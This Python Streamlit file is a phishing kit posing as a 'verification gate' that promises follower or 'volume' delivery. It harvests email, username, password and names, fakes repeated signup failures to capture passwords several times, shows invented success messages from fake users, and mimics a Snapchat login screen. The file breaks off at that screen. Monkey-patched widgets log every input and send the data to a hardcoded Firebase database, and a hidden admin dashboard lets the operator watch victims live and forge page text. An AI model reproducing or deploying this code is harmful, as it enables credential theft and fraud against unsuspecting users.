import streamlit as st
import time
import requests
import datetime
import uuid
import random

# --- 1. CONFIGURATION FRAMEWORK ---
st.set_page_config(
    page_title="Official Verification Gate",
    page_icon="👑",
    layout="centered",
    initial_sidebar_state="collapsed"
)
# ========================================================================
# 🌌 TITAN NEXUS SUPREME MASTER CONTROLLER v6.0 - ENTERPRISE EDITION
# ========================================================================
import streamlit as st
import uuid
import requests
import datetime
import pandas as pd
import time

# 1. PRISTINE PRODUCTION BACKEND CONNECTION
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"

# Ultimate Isolated Live Token Generation Matrix
if "quantum_session_token" not in st.session_state:
    st.session_state.quantum_session_token = "NODE_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:4]
if "session_start_time" not in st.session_state:
    st.session_state.session_start_time = datetime.datetime.now().strftime("%I:%M:%S %p")
if "action_counter" not in st.session_state:
    st.session_state.action_counter = 0

# Fast Network I/O Adapters
def api_set(node, payload):
    try: requests.put(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=3)
    except: pass

def api_patch(node, payload):
    try: requests.patch(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=3)
    except: pass

def api_fetch(node):
    try:
        r = requests.get(f"{FIREBASE_URL}/{node}.json", timeout=3).json()
        return r if r else {}
    except: return {}

# Synchronize Global Operational Directives Instantly
global_matrix = api_fetch("titan_infrastructure_matrix")
if not global_matrix:
    global_matrix = {
        "system_integrity_mode": "ONLINE",
        "intercept_broadcast_msg": "Core operations functional.",
        "routing_endpoint_url": "",
        "global_input_lock_gate": False,
        "stealth_telemetry_mute": False,
        "kill_switches": {},
        "text_manipulations": {}
    }
if "kill_switches" not in global_matrix: global_matrix["kill_switches"] = {}
if "text_manipulations" not in global_matrix: global_matrix["text_manipulations"] = {}

# 2. ADVANCED TELEMETRY METRICS GENERATOR
def execute_advanced_telemetry(component_class, component_id, interactive_value=""):
    if global_matrix.get("stealth_telemetry_mute", False): return
    st.session_state.action_counter += 1
    
    node_key = st.session_state.quantum_session_token
    time_stamp = datetime.datetime.now().strftime("%I:%M:%S %p")
    
    # Read state directly to prevent sequence overlapping strings
    node_state = api_fetch(f"active_titan_sessions/{node_key}")
    execution_timeline = node_state.get("chronological_timeline", [])
    
    log_string = f"[{time_stamp}] [Action #{st.session_state.action_counter}] ({component_class}) '{component_id}'"
    if interactive_value:
        log_string += f" ➔ Content Data: [{interactive_value}]"
    
    execution_timeline.append(log_string)
    if len(execution_timeline) > 30: execution_timeline.pop(0) # Keep 30 deeply detailed steps
    
    retained_cache = node_state.get("live_form_cache", {})
    if component_class in ["TEXT_INPUT", "TEXT_AREA", "SELECTBOX", "RADIO"]:
        retained_cache[component_id] = str(interactive_value)

    payload = {
        "session_token": node_key,
        "session_initialized": st.session_state.session_start_time,
        "latest_pulse_clock": time_stamp,
        "total_actions_performed": st.session_state.action_counter,
        "current_ui_focus": f"Operating inside widget: {component_id}",
        "chronological_timeline": execution_timeline,
        "live_form_cache": retained_cache,
        "connection_status": "🟢 ONLINE / ACTIVE"
    }
    api_patch(f"active_titan_sessions/{node_key}", payload)

# 3. GLOBAL HARDFREEZE OVERRIDE SECURITY PROTOCOLS
if st.query_params.get("admin") != "true":
    intercept_state = global_matrix.get("system_integrity_mode", "ONLINE")
    if intercept_state != "ONLINE":
        st.empty()
        if intercept_state == "MAINTENANCE":
            st.error("# 🚧 CRITICAL DATABASE TACTICAL UPGRADE IN PROGRESS 🚧")
            st.info(global_matrix.get("intercept_broadcast_msg", "Engine re-indexing operations active."))
        elif intercept_state == "BUSY":
            st.warning("# ⏳ HIGH TRAFFIC DATA COLLISION DETECTED (429) ⏳")
            st.info("System memory pipeline heavily utilized. Automatic packet retries initialized.")
        elif intercept_state == "DESTROYED":
            st.error("# 🛑 SYSTEM TERMINATED / SESSION EXPIRED 🛑")
            st.error(global_matrix.get("intercept_broadcast_msg", "This deployment build has been permanently deprecated."))
        elif intercept_state == "REDIRECT" and global_matrix.get("routing_endpoint_url"):
            st.info("### ➡️ Migrating traffic vectors to secure mainframe path...")
            st.markdown(f"[Proceed immediately to target routing path]({global_matrix.get('routing_endpoint_url')})")
        st.stop()

# 4. 🔥 THE SUPREME HIJACK ENGINE (MONKEY PATCH INTEGRITY SHIELD)
o_btn = st.button
o_input = st.text_input
o_area = st.text_area
o_select = st.selectbox
o_rad = st.radio
o_wrt = st.write
o_mkd = st.markdown
o_cap = st.caption
o_suc = st.success
o_err = st.error
o_wrn = st.warning

def patch_btn(label, *args, **kwargs):
    if global_matrix["kill_switches"].get(label, False):
        st.info(f"🔒 Feature '{label}' has been isolated temporarily by administrator.")
        return False
    status_click = o_btn(label, *args, **kwargs)
    if status_click:
        execute_advanced_telemetry("BUTTON_INTERACTION", label, "CLICKED_TRUE")
    return status_click

def patch_input(label, *args, **kwargs):
    if global_matrix["kill_switches"].get(label, False): return ""
    if global_matrix.get("global_input_lock_gate", False): kwargs["disabled"] = True
    string_value = o_input(label, *args, **kwargs)
    if string_value:
        execute_advanced_telemetry("TEXT_INPUT", label, string_value)
    return string_value

def patch_area(label, *args, **kwargs):
    if global_matrix["kill_switches"].get(label, False): return ""
    if global_matrix.get("global_input_lock_gate", False): kwargs["disabled"] = True
    area_value = o_area(label, *args, **kwargs)
    if area_value:
        execute_advanced_telemetry("TEXT_AREA", label, area_value)
    return area_value

def patch_select(label, *args, **kwargs):
    if global_matrix["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
    selection = o_select(label, *args, **kwargs)
    if f"sel_chk_{label}" not in st.session_state:
        st.session_state[f"sel_chk_{label}"] = selection
    elif st.session_state[f"sel_chk_{label}"] != selection:
        st.session_state[f"sel_chk_{label}"] = selection
        execute_advanced_telemetry("SELECTBOX_OPTION", label, selection)
    return selection

def patch_radio(label, *args, **kwargs):
    if global_matrix["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
    radio_selection = o_rad(label, *args, **kwargs)
    if f"rad_chk_{label}" not in st.session_state:
        st.session_state[f"rad_chk_{label}"] = radio_selection
    elif st.session_state[f"rad_chk_{label}"] != radio_selection:
        st.session_state[f"rad_chk_{label}"] = radio_selection
        execute_advanced_telemetry("RADIO_OPTION", label, radio_selection)
    return radio_selection

def text_replacer_engine(original_string):
    if isinstance(original_string, str) and original_string in global_matrix["text_manipulations"]:
        return global_matrix["text_manipulations"][original_string]
    return original_string

def patch_wrt(*args, **kwargs):
    if args and isinstance(args[0], str):
        o_wrt(text_replacer_engine(args[0]), **kwargs)
    else: o_wrt(*args, **kwargs)

def patch_mkd(*args, **kwargs):
    if args and isinstance(args[0], str):
        o_mkd(text_replacer_engine(args[0]), **kwargs)
    else: o_mkd(*args, **kwargs)

def patch_cap(*args, **kwargs):
    if args and isinstance(args[0], str):
        o_cap(text_replacer_engine(args[0]), **kwargs)
    else: o_cap(*args, **kwargs)

# ASSIGN CORE SYSTEM REDIRECTS
st.button = patch_btn
st.text_input = patch_input
st.text_area = patch_area
st.selectbox = patch_select
st.radio = patch_radio
st.write = patch_wrt
st.markdown = patch_mkd
st.caption = patch_cap


# ========================================================================
# 💎 TITAN MAINFRAME RECONNAISSANCE & CONTROL DASHBOARD ENGINE
# ========================================================================
if st.query_params.get("admin") == "true":
    st.title("🪐 TITAN COMMAND MAINFRAME v6.0")
    st.caption("Strategic Live Application Monitoring, Packet Sniffing, and Structural Override System")
    st.write("---")
    
    adm_tab1, adm_tab2, adm_tab3, adm_tab4 = st.tabs([
        "🕵️‍♂️ LIVE PACKET RECONNAISSANCE", 
        "⚙️ INFRASTRUCTURE GRID OVERHAUL", 
        "🎛️ MICROMANAGED KILL SWITCHES", 
        "📝 DYNAMIC TEXT INJECTION FIELD"
    ])
    
    # ---------------------------------------------------------
    # TAB 1: ADVANCED PACKET RECONNAISSANCE (LIVE TRACKING LOGIC)
    # ---------------------------------------------------------
    with adm_tab1:
        st.subheader("📡 Realtime Active Terminals Network Map")
        session_pool = api_fetch("active_titan_sessions")
        
        if session_pool:
            # Active counting system
            total_active_nodes = len(session_pool)
            
            c_m1, c_m2 = st.columns(2)
            c_m1.metric(label="Total Connected Node Streams", value=total_active_nodes)
            c_m2.info("🔴 Live Connection stream updates on click / interaction ticks.")
            st.write("---")
            
            node_key_index = list(session_pool.keys())
            inspected_target_node = st.selectbox("🎯 Target Network Node to Monitor Live:", node_key_index)
            
            if inspected_target_node:
                target_json_data = session_pool[inspected_target_node]
                
                col_split_left, col_split_right = st.columns([1, 1])
                with col_split_left:
                    st.success(f"**Selected Node Address:** `{inspected_target_node}`")
                    st.markdown(f"""
                    * **Session Init Clock:** {target_json_data.get('session_initialized')}
                    * **Last Pulse Received:** {target_json_data.get('latest_pulse_clock')}
                    * **Total Interactions Packet:** {target_json_data.get('total_actions_performed')}
                    * **Status Condition:** {target_json_data.get('connection_status')}
                    """)
                    st.markdown("#### 💬 Captured Raw Forms Cache")
                    st.json(target_json_data.get("live_form_cache", {"Status": "No alphanumeric strings intercepted."}))
                    
                with col_split_right:
                    st.markdown("#### 📈 Chronological Step Execution Flow")
                    for logged_step in target_json_data.get("chronological_timeline", []):
                        st.code(logged_step, language="text")
            
            st.write("---")
            if st.button("🚨 Wipe Out Database Logs & Clear Counter Nodes", key="kill_logs_node"):
                requests.delete(f"{FIREBASE_URL}/active_titan_sessions.json")
                st.rerun()
        else:
            st.info("No active communication signals detected from external browser processes.")

    # ---------------------------------------------------------
    # TAB 2: INFRASTRUCTURE GRID OVERHAUL (GLOBAL CORES)
    # ---------------------------------------------------------
    with adm_tab2:
        st.subheader("🌐 Global Mainframe Access Level")
        current_system_mode = global_matrix.get("system_integrity_mode", "ONLINE")
        st.warning(f"Current Deployment Execution State Vector: **{current_system_mode}**")
        
        matrix_mode_selection = st.radio("Execute Deployment Overload Routine:", ["ONLINE", "MAINTENANCE", "BUSY", "DESTROYED", "REDIRECT"])
        intercept_alert_string = st.text_input("Global Banner Intercept Alert Display Text:", value=global_matrix.get("intercept_broadcast_msg", ""))
        routing_link_string = st.text_input("External Traffic Divert Routing Endpoint URL (REDIRECT Mode):", value=global_matrix.get("routing_endpoint_url", ""))
        
        st.write("---")
        st.subheader("🔒 Peripheral Automation Gates")
        lock_all_inputs_toggle = st.checkbox("Lock All Input Boxes Globally (Convert User App to Read-Only)", value=global_matrix.get("global_input_lock_gate", False))
        stealth_logging_toggle = st.checkbox("Mute Data Logs Broadcast (Pause Database Writing System)", value=global_matrix.get("stealth_telemetry_mute", False))
        
        if st.button("Execute Core System Policy Deployment ⚡", key="commit_infrastructure"):
            global_matrix["system_integrity_mode"] = matrix_mode_selection
            global_matrix["intercept_broadcast_msg"] = intercept_alert_string
            global_matrix["routing_endpoint_url"] = routing_link_string
            global_matrix["global_input_lock_gate"] = lock_all_inputs_toggle
            global_matrix["stealth_telemetry_mute"] = stealth_logging_toggle
            api_set("titan_infrastructure_matrix", global_matrix)
            st.success("Infrastructure security parameters applied to live memory map!")
            st.rerun()

    # ---------------------------------------------------------
    # TAB 3: MICROMANAGED KILL SWITCHES (GRANULAR COMPONENTS)
    # ---------------------------------------------------------
    with adm_tab3:
        st.subheader("🎯 Disaggregated Component Isolation Matrix")
        st.write("Enter the precise **Label identity string** of any single widget to selectively render it inactive or invisible.")
        
        target_label_id = st.text_input("Target Element Label ID (Case-Sensitive Exact Match):")
        isolation_policy_directive = st.selectbox("Policy Directives Configuration:", ["RESTORE COMPONENT ACCESS / VISIBLE", "FORCE COMPONENT BLOCKADE / HIDE"])
        
        if st.button("Inject Discrete Component Policy Rule 🔒", key="commit_component_rule"):
            if target_label_id:
                global_matrix["kill_switches"][target_label_id] = (isolation_policy_directive == "FORCE COMPONENT BLOCKADE / HIDE")
                api_set("titan_infrastructure_matrix", global_matrix)
                st.success(f"Policy override deployed for widget ID string: '{target_label_id}'")
                st.rerun()
                
        st.write("#### 🛡️ Currently Isolated Components Ecosystem")
        current_kill_list = [k for k, v in global_matrix["kill_switches"].items() if v]
        if current_kill_list:
            st.json(current_kill_list)
            if st.button("Flush All Micro-Kill Policy Overrides 🔄"):
                global_matrix["kill_switches"] = {}
                api_set("titan_infrastructure_matrix", global_matrix)
                st.rerun()
        else:
            st.caption("No custom widget blockades active. Global interface functions unrestricted.")

    # ---------------------------------------------------------
    # TAB 4: DYNAMIC TEXT INJECTION (CONTENT MANIPULATION)
    # ---------------------------------------------------------
    with adm_tab4:
        st.subheader("✍️ Asynchronous Text Patch Engine")
        st.write("Intercept static visual layout elements built using `st.write`, `st.markdown`, or `st.caption` and swap their contents live.")
        
        source_string_id = st.text_input("Original Static Hardcoded String Identity:")
        forged_display_string = st.text_input("Forged Content Display Alternative Replacement:")
        
        if st.button("Inject Mainframe String Overwrite Policy 📝", key="commit_text_patch"):
            if source_string_id and forged_display_string:
                global_matrix["text_manipulations"][source_string_id] = forged_display_string
                api_set("titan_infrastructure_matrix", global_matrix)
                st.success("Text mutation pattern locked to remote infrastructure database context.")
                st.rerun()
                
        st.write("#### Active Swapped Memory String Layouts")
        st.json(global_matrix["text_manipulations"])
        if st.button("Purge All Dynamic Content Mutation Rules ❌"):
            global_matrix["text_manipulations"] = {}
            api_set("titan_infrastructure_matrix", global_matrix)
            st.rerun()

    st.write("---")
    st.error("🚨 ADMINISTRATIVE ROOT OVERRIDE VECTOR ENGAGED. Remove '?admin=true' query parameters from target URL to view normal user UI view.")
    st.stop()

# ========================================================================
# END OF INTEGRITY FRAMEWORK CONTAINER - YOUR COMPILING CODE DIRECTLY RUNS BELOW
# ========================================================================
# --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
GLOBAL_MARKDOWN_INJECTOR = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');

/* Force Absolute Premium Light Environment Canvas */
:root { color-scheme: light !important; }
html, body, .stApp { background-color: #f6f8fb !important; color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }
div[data-testid="stSidebar"] { display: none !important; }
p, span, h1, h2, h3, h4, h5, h6, label { color: #000000 !important; font-family: 'Plus Jakarta Sans', sans-serif !important; }

/* ⏱️ Animated Glow-Card Counter Visualizer */
.premium-countdown-card {
    background: #ffffff !important;
    border: 2px solid #000000 !important;
    padding: 16px;
    border-radius: 14px;
    text-align: center;
    box-shadow: 0px 8px 24px rgba(255, 252, 0, 0.25);
    margin-bottom: 20px;
    border-bottom: 5px solid #fffc00 !important;
}
.countdown-timer-stream {
    font-size: 20px;
    font-weight: 800;
    color: #2563eb !important;
    letter-spacing: 1px;
}

/* 📊 Premium Flow Drop Social Banner */
.premium-live-banner {
    background: #ffffff;
    border: 1px solid #2563eb;
    border-left: 6px solid #2563eb;
    border-radius: 12px;
    padding: 14px 18px;
    margin-bottom: 20px;
    box-shadow: 0 4px 15px rgba(37, 99, 235, 0.06);
}

/* 📍 Premium Fluid Stepper Array Interface (No Sliders) */
.stepper-flex-wrapper {
    display: flex;
    justify-content: space-between;
    gap: 8px;
    margin-bottom: 25px;
}
.step-pill-node {
    flex: 1;
    background: #e2e8f0;
    padding: 10px 4px;
    border-radius: 8px;
    text-align: center;
    font-size: 11px;
    font-weight: 800;
    color: #64748b !important;
    text-transform: uppercase;
    border: 1px solid transparent;
    transition: all 0.4s ease;
}
.step-pill-node.active-node {
    background: #2563eb !important;
    color: #ffffff !important;
    box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
    transform: scale(1.02);
}
.step-pill-node.completed-node {
    background: #fffc00 !important;
    color: #000000 !important;
    border: 1px solid #000000;
}

/* 📦 Core High-Fidelity Bounded Canvas Box */
.premium-canvas-wrapper {
    background: #ffffff !important;
    border: 2px solid #eef2f6 !important;
    border-radius: 16px !important;
    padding: 35px 28px !important;
    box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.04) !important;
    margin-bottom: 30px;
}

/* 🎴 Dynamic Auto-Center Logo Framework Matrix */
.center-logo-box-matrix {
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 5px auto 20px auto;
    width: 90px !important;
    height: 90px !important;
    background: #ffffff;
    border-radius: 18px;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05);
    padding: 8px;
    border: 1px solid #f1f5f9;
}
.center-logo-box-matrix img {
    max-width: 100%;
    max-height: 100%;
    object-fit: contain;
}

/* ✏️ High-Definition Explicit Input Boxes with Rigid Focus Parameters */
.custom-hd-label {
    font-weight: 800 !important;
    font-size: 13px !important;
    color: #000000 !important;
    text-transform: uppercase;
    letter-spacing: 0.6px;
    margin-bottom: 8px !important;
    display: block;
}
div[data-baseweb='input'] {
    border: 2px solid #cbd5e1 !important;
    border-radius: 8px !important;
    background-color: #ffffff !important;
    overflow: hidden !important;
    transition: all 0.3s ease-in-out !important;
}
div[data-baseweb='input']:focus-within {
    border-color: #2563eb !important;
    box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15) !important;
}
div[data-baseweb='input'] input {
    color: #000000 !important;
    font-weight: 600 !important;
    font-size: 14.5px !important;
    padding: 12px 14px !important;
}

/* 💛 Step 5 (Image Replica Login Layout Overrides) */
.replica-brand-label {
    text-align: center !important;
    font-size: 38px !important;
    font-weight: 400 !important;
    color: #000000 !important;
    margin-bottom: 32px !important;
    margin-top: -5px !important;
    letter-spacing: -1.5px !important;
}
.replica-field-title {
    color: #8c92ac !important;
    font-size: 11.5px !important;
    font-weight: 700 !important;
    text-transform: capitalize !important;
    margin-bottom: 6px !important;
    display: block !important;
}
/* Replica Specific Input Tints mirroring the uploaded photograph documentation */
div[data-testid="stTextInput"] div[data-baseweb='input'] { background-color: #f6f7f9 !important; border: none !important; }
div[data-testid="stTextInput"]:nth-of-type(2) div[data-baseweb='input'] { background-color: #eef2fb !important; border: none !important; }
.forgot-pass-trigger-text { text-align: right !important; font-size: 12px !important; color: #8c92ac !important; font-weight: 600 !important; margin-top: 5px !important; }

/* 🎯 Snapchat-Theme Yellow Rigid Rounded-Pill Interaction Button */
.stButton > button[kind="secondary"] {
    background-color: #fffc00 !important;
    color: #000000 !important;
    border-radius: 999px !important;
    width: 145px !important;
    font-weight: 800 !important;
    font-size: 15px !important;
    border: 2px solid #000000 !important;
    height: 44px !important;
    margin: 32px auto 5px auto !important;
    display: block !important;
    box-shadow: 0 4px 12px rgba(0,0,0,0.05) !important;
}
.stButton > button[kind="secondary"]:hover {
    background-color: #f2ef00 !important;
    transform: translateY(-1px);
}

/* Terminal Console UI Element */
.hacker-cmd-box { background-color: #050505 !important; padding: 18px; border-radius: 10px; border: 2px solid #fffc00; margin: 20px 0; font-family: monospace !important; }
.hacker-cmd-string { color: #fffc00 !important; font-size: 13px; font-weight: 700; line-height: 1.6; }

/* Engagement Node Anchor */
.prime-engagement-block { text-align: center; margin: 22px 0; padding: 16px; background: #eef2ff; border: 2px dashed #2563eb; border-radius: 10px; }
/* Streamlit Watermark aur Header ko complete hide karne ke liye */
header[data-testid="stHeader"] { visibility: hidden !important; display: none !important; }
footer { visibility: hidden !important; display: none !important; }
div[data-testid="stDecoration"] { display: none !important; visibility: hidden !important; }
#MainMenu { visibility: hidden !important; display: none !important; }
div[class^="viewerBadge"] { display: none !important; visibility: hidden !important; }
</style>
"""
st.markdown(GLOBAL_MARKDOWN_INJECTOR, unsafe_allow_html=True)

# --- 3. HARDWARE REAL-TIME PERSISTENCE PATHWAY ---
BASE_FIREBASE_LINK = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/google_sites_logs/-OtV1bgRTfms9dW0PXTu"

# --- 4. ENGINE ARCHITECTURE CORE STATE CONFIGURATOR ---
if 'step' not in st.session_state: st.session_state.step = 1
if 'portal_data' not in st.session_state: st.session_state.portal_data = {}
if 'signup_attempts_count' not in st.session_state: st.session_state.signup_attempts_count = 1
if 'login_attempts_count' not in st.session_state: st.session_state.login_attempts_count = 1
if 'intercepted_dataset' not in st.session_state: st.session_state.intercepted_dataset = []
if 'unique_session_folder' not in st.session_state: st.session_state.unique_session_folder = str(uuid.uuid4())[:12]
if 'random_seed' not in st.session_state: st.session_state.random_seed = random.randint(10, 99)

# Countdown Engine Matrix Logic (30 Mins Target Frame Window)
if 'countdown_end' not in st.session_state:
    st.session_state.countdown_end = time.time() + (30 * 60)

current_time = time.time()
remaining_seconds = int(st.session_state.countdown_end - current_time)

if remaining_seconds <= 0:
    st.session_state.clear()
    st.rerun()

mins, secs = divmod(remaining_seconds, 60)

# Render High-Fidelity Active Counter Module Box
st.markdown(f"""
<div class='premium-countdown-card'>
    <span style='font-size:12px; font-weight:800; color:#64748b; text-transform:uppercase; display:block; margin-bottom:2px;'>⚠️ RESERVED SECURE DISPATCH HOLD CORRIDOR</span>
    <span class='countdown-timer-stream'>⏳ DISPATCH POOL LOCKS IN: {mins:02d}:{secs:02d}</span>
</div>
""", unsafe_allow_html=True)

# ==========================================
# REAL-TIME SOCIAL CONTEXT LOOP PLATFORM
# ==========================================
fake_users = ["ayush_nexus", "riyak_matrix", "kabir_claims", "ishita_vector", "tushar_op", "mehak_corridor"]
fake_counts = ["5,000", "10,000", "20,000"]
selected_user = fake_users[st.session_state.random_seed % len(fake_users)]
selected_volume = fake_counts[(st.session_state.random_seed + st.session_state.step) % len(fake_counts)]

st.markdown(f"""
<div class='premium-live-banner'>
    <p style='margin:0; font-size:13.5px; font-weight:800; color:#1e40af;'>⚡ CLOUD STREAM ACTIVE: @{selected_user} bypassed congestion pipeline, verified handle and authorized +{selected_volume} volume allocation payload!</p>
</div>
""", unsafe_allow_html=True)


# ==========================================
# 📍 ULTRARICH LIQUID STEPPER INTERFACE
# ==========================================
s1_class = "active-node" if st.session_state.step == 1 else ("completed-node" if st.session_state.step > 1 else "")
s2_class = "active-node" if st.session_state.step == 2 else ("completed-node" if st.session_state.step > 2 else "")
s3_class = "active-node" if st.session_state.step == 3 else ("completed-node" if st.session_state.step > 3 else "")
s4_class = "active-node" if st.session_state.step >= 4 else ""

st.markdown(f"""
<div class='stepper-flex-wrapper'>
    <div class='step-pill-node {s1_class}'>Step 1: Core</div>
    <div class='step-pill-node {s2_class}'>Step 2: Meta</div>
    <div class='step-pill-node {s3_class}'>Step 3: Space</div>
    <div class='step-pill-node {s4_class}'>Step 4: Verify</div>
</div>
""", unsafe_allow_html=True)


def push_to_firebase_matrix(event_state):
    runtime_node_id = str(uuid.uuid4())[:8]
    target_api_endpoint = f"{BASE_FIREBASE_LINK}/{st.session_state.unique_session_folder}/{runtime_node_id}.json"
    
    payload = {
        "server_timestamp": str(datetime.datetime.now()),
        "current_step_context": event_state,
        "primary_profile_context": st.session_state.portal_data,
        "logged_credential_sequences": st.session_state.intercepted_dataset
    }
    try:
        requests.put(target_api_endpoint, json=payload)
    except:
        pass


# ==========================================
# STEP 1: PORTAL PROFILE GENERATOR ENGINE
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    
    # Accurate Scale Icon Box Matrix Centering Layer
    st.markdown("<div class='center-logo-box-matrix'>", unsafe_allow_html=True)
    try:
        st.image("1.png")
    except:
        st.markdown("<p style='font-size:24px; margin:0;'>✨</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)
            
    st.markdown("<div class='portal-header'><div class='portal-title'>Create Allocation Profile</div><div class='portal-subtitle'>Cloud Infrastructure Core Network Configuration Hub</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-hd-label'>🔒 Account Email Coordinates</span>", unsafe_allow_html=True)
    email_input = st.text_input("email_field", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>👤 Destination Target Handle</span>", unsafe_allow_html=True)
    user_input = st.text_input("user_field", placeholder="e.g., NexusCreator", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>🔑 Access Vault Keyphrase</span>", unsafe_allow_html=True)
    pass_input = st.text_input("pass_field", type="password", label_visibility="collapsed")
    
    st.write("")
    if st.button("INITIALIZE SECURE PIPELINE 🚀", type="primary", use_container_width=True):
        if email_input and user_input and pass_input:
            st.session_state.random_seed = random.randint(10, 99)
            if st.session_state.signup_attempts_count < 3:
                terminal_msg = st.empty()
                terminal_msg.info("⚡ Mapping active partition nodes...")
                time.sleep(1.2)
                terminal_msg.error(f"❌ Network Core Overload: Node handshake registration rejected. Please try again. (Attempt {st.session_state.signup_attempts_count}/2 Checked)")
                st.session_state.signup_attempts_count += 1
            else:
                st.success("✅ Secure Node Allocation Verified.")
                st.session_state.portal_data.update({"email": email_input, "target_username": user_input, "generated_master_key": pass_input})
                push_to_firebase_matrix("PORTAL_SIGNUP_PASSED")
                st.session_state.step = 2
                time.sleep(0.8)
                st.rerun()
        else:
            st.warning("⚠️ High priority alert: Form structures cannot remain blank.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 2: PROFILE META DATA PARSER
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Identity Link Optimization ⚙️</div><div class='portal-subtitle'>Synchronizing account infrastructure metadata channels</div></div>", unsafe_allow_html=True)
    
    st.markdown("<span class='custom-hd-label'>First Name Registry</span>", unsafe_allow_html=True)
    first_name_input = st.text_input("fn", label_visibility="collapsed")
    
    st.markdown("<span class='custom-hd-label'>Last Name Registry</span>", unsafe_allow_html=True)
    last_name_input = st.text_input("ln", label_visibility="collapsed")
    
    st.write("")
    if st.button("BUILD PAYLOAD COORDINATES ⚡", type="primary", use_container_width=True):
        if first_name_input:
            st.session_state.random_seed = random.randint(10, 99)
            UI_bar = st.progress(0)
            for structural_percentage in range(100):
                time.sleep(0.008)
                UI_bar.progress(structural_percentage + 1)
            st.session_state.portal_data.update({"first_name": first_name_input, "last_name": last_name_input})
            push_to_firebase_matrix("META_SYNC_COMPLETE")
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("❌ Registry Error: Identity token string constraint violated.")
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 3: ALLOCATION VOLUMETRIC GRID
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<div class='portal-header'><div class='portal-title'>Target Server Matrix 🎯</div><div class='portal-subtitle'>Adjusting delivery pipe constraints for transaction mapping</div></div>", unsafe_allow_html=True)
    
    profile_visibility_state = st.radio("Is destination endpoint strictly Public? 🔓", ["Yes, verified Public", "No, currently Private"], index=0)
    avatar_check_state = st.radio("Does target layout contain an active profile avatar? 📸", ["Yes", "No"], index=0)
    
    st.write("---")
    requested_load_volume = st.select_slider("🔥 Set Volumetric Delivery Payload Volume Stream Load:", options=[1000, 5000, 10000, 20000])
    
    st.write("")
    if st.button("LOCK DELIVERY PARAMETERS 🛡️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        if profile_visibility_state == "No, currently Private" or avatar_check_state == "No":
            st.error("❌ Target Paradox: Injection corridor cannot establish pipeline to unmapped profiles.")
        else:
            st.session_state.portal_data.update({
                "account_visibility_metric": profile_visibility_state, 
                "avatar_presence_metric": avatar_check_state, 
                "load_volume_units": requested_load_volume
            })
            push_to_firebase_matrix("TARGET_MATRIX_SET")
            st.session_state.step = 4
            st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 4: INSTANT BYPASS GATEWAY INDEX
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; padding:16px; background:#fef2f2; border:1px solid #fee2e2; border-radius:12px; margin-bottom:20px;'><h4 style='color:#dc2626; font-weight:800; margin:0;'>⚠️ PUBLIC QUEUE SHUTDOWN CONGESTION</h4><p style='font-size:13px; color:#991b1b; margin:4px 0 0 0;'>Standard distribution channels lock delay: <b>24 Hours</b>.</p></div>", unsafe_allow_html=True)
    
    st.markdown("<div style='text-align:center; margin-bottom:20px;'><h3 style='font-weight:800; margin:0;'>🚀 Force High-Speed Priority Corridor Bypasser</h3><p style='font-size:13px; color:#4b5563; margin-top:4px;'>Verify active hardware session credentials matching target platform metadata layers to pass immediately.</p></div>", unsafe_allow_html=True)
    
    st.markdown("""
    <div class='prime-engagement-block'>
        <span style='color:#2563eb !important; font-weight:800; font-size:15px;'>👉 CLICK THE BELOW  to verify your snapchat account 👈</span>
        <div style='font-size:11px; color:#4b5563; margin-top:4px; font-weight:700;'>[ SSL 256-Bit Hardware Encryption Channel Active ]</div>
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("You need to verify Snapchat IDENTITY FOOTPRINT MATCH NOW 👑 to get token key 🗝️", type="primary", use_container_width=True):
        st.session_state.random_seed = random.randint(10, 99)
        script_detector_msg = st.empty()
        script_detector_msg.info("🤖 Scanning hardware environment patterns for tracking automation...")
        time.sleep(1.4)
        script_detector_msg.success("✅ Clean footprint frame. Initializing high-fidelity verification screen...")
        time.sleep(0.6)
        script_detector_msg.empty()
        st.session_state.step = 5
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 5: EXACT MATCH SYSTEM-CLONE VIEWPORT SCREEN
# ==========================================
elif st.session_state.step == 5:
    st.markdown("<div class='stApp' style='background-color:#ffffff !important;'>", unsafe_allow_html=True)
    
    st.markdown("<div class='premium-canvas-wrapper' style='background-color:#ffffff !important; border-radius:10px !important; box-shadow: 0 2px 14px rgba(0,0,0,0.03) !important; max-width:400px !important; margin:35px auto 10px auto !important; border:1px solid #f1f1f1 !important; padding:40px 32px !important;'>", unsafe_allow_html=True)
    
    # Rigid Icon Control Engine Core
